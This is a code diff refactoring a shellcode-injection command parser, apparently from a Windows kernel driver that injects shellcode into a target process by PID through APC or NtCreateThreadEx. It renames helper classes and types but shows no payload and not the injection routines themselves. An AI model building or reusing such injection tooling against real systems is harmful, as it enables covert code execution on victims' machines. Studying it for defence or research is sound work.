@@ -1,7 +1,7 @@
 #include "pch.h"
 #include "ShellcodeInjectionParser.h"
-#include "MemoryUtils.hpp"
-#include "ProcessUtils.hpp"
+#include "MemoryHandler.h"
+#include "ProcessHandler.h"
 
 ShellcodeInjectionParser::ShellcodeInjectionParser() {
 	this->paramsSize = nullptr;
@@ -44,7 +44,7 @@ ShellcodeInjectionParser::~ShellcodeInjectionParser() {
 * @status	 [NTSTATUS] -- Result of the command.
 */
 NTSTATUS ShellcodeInjectionParser::Execute(Options commandId, PVOID args[MAX_ARGS]) {
-	ShellcodeInformation shellcodeInfo{};
+	IoctlShellcodeInfo shellcodeInfo{};
 	NTSTATUS status = STATUS_SUCCESS;
 
 	shellcodeInfo.Pid = *(ULONG*)args[0];
@@ -73,26 +73,26 @@ NTSTATUS ShellcodeInjectionParser::Execute(Options commandId, PVOID args[MAX_ARG
 	switch (commandId) {
 	case Options::APC:
 	{
-		shellcodeInfo.Type = APCInjection;
+		shellcodeInfo.Type = InjectionType::APCInjection;
 
 		if (!Features.ApcInjection) {
 			status = STATUS_UNSUCCESSFUL;
 			break;
 		}
 
-		status = NidhoggMemoryUtils->InjectShellcodeAPC(&shellcodeInfo);
+		status = NidhoggMemoryHandler->InjectShellcodeAPC(shellcodeInfo);
 		break;
 	}
 	case Options::Thread:
 	{
-		shellcodeInfo.Type = NtCreateThreadExInjection;
+		shellcodeInfo.Type = InjectionType::NtCreateThreadExInjection;
 
 		if (!Features.CreateThreadInjection) {
 			status = STATUS_UNSUCCESSFUL;
 			break;
 		}
 
-		status = NidhoggMemoryUtils->InjectShellcodeThread(&shellcodeInfo);
+		status = NidhoggMemoryHandler->InjectShellcodeThread(shellcodeInfo);
 		break;
 	}
 	default:
